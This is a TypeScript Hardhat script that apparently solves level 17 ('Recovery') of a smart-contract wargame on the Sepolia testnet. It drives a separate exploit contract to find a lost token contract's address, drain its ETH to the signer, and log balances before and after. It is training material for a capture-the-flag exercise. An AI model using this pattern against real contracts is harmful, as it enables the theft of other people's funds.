import { ethers } from "hardhat";
import { formatEther } from "ethers";

/**
 * Execute the Recovery exploit to recover lost ETH from the token contract
 * 
 * Usage:
 * RECOVERY_INSTANCE_ADDRESS=0xYourRecoveryAddress RECOVERY_SOLUTION_ADDRESS=0xYourExploitAddress npx hardhat run scripts/level-17-recovery/execute-recovery-exploit.ts --network sepolia
 */
async function main() {
  console.log("Executing Recovery exploit...");
  
  // Get the addresses from environment
  const recoveryAddress = process.env.RECOVERY_INSTANCE_ADDRESS;
  const exploitAddress = process.env.RECOVERY_SOLUTION_ADDRESS;
  
  if (!recoveryAddress || !exploitAddress) {
    throw new Error("Environment variables RECOVERY_INSTANCE_ADDRESS and RECOVERY_SOLUTION_ADDRESS must be set");
  }
  
  console.log(`Using Recovery instance at: ${recoveryAddress}`);
  console.log(`Using RecoveryExploit contract at: ${exploitAddress}`);
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  // Connect to the exploit contract
  const recoveryExploit = await ethers.getContractAt("RecoveryExploit", exploitAddress);
  
  // Calculate the token address using the exploit contract
  const tokenAddress = await recoveryExploit.computeTokenAddress();
  console.log(`Calculated token address: ${tokenAddress}`);
  
  // Check the token's ETH balance before recovery
  const balanceBefore = await ethers.provider.getBalance(tokenAddress);
  console.log(`Token contract balance before recovery: ${formatEther(balanceBefore)} ETH`);
  
  // Get the token details if possible
  try {
    const [name, balance] = await recoveryExploit.checkTokenDetails(tokenAddress);
    console.log(`Token name: ${name}`);
    console.log(`Token contract balance: ${formatEther(balance)} ETH`);
  } catch (error) {
    console.log("Could not get token details. This is expected if the token contract doesn't exist yet.");
  }
  
  // Check signer's balance before recovery
  const signerBalanceBefore = await ethers.provider.getBalance(signer.address);
  console.log(`Signer balance before recovery: ${formatEther(signerBalanceBefore)} ETH`);
  
  // Execute the exploit to recover the lost funds
  console.log("Executing recovery of lost funds...");
  const tx = await recoveryExploit.recoverLostFunds(signer.address);
  const receipt = await tx.wait();
  console.log(`Recovery transaction hash: ${receipt?.hash}`);
  
  // Check token balance after recovery (should be 0)
  const balanceAfter = await ethers.provider.getBalance(tokenAddress);
  console.log(`Token contract balance after recovery: ${formatEther(balanceAfter)} ETH`);
  
  // Check signer's balance after recovery
  const signerBalanceAfter = await ethers.provider.getBalance(signer.address);
  console.log(`Signer balance after recovery: ${formatEther(signerBalanceAfter)} ETH`);
  
    
  // Check if the exploit was successful
  const recovered = await recoveryExploit.recovered();
  if (recovered) {
    console.log("✅ Success! The lost funds have been recovered.");
  } else {
    console.log("❌ The recovery was not successful.");
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
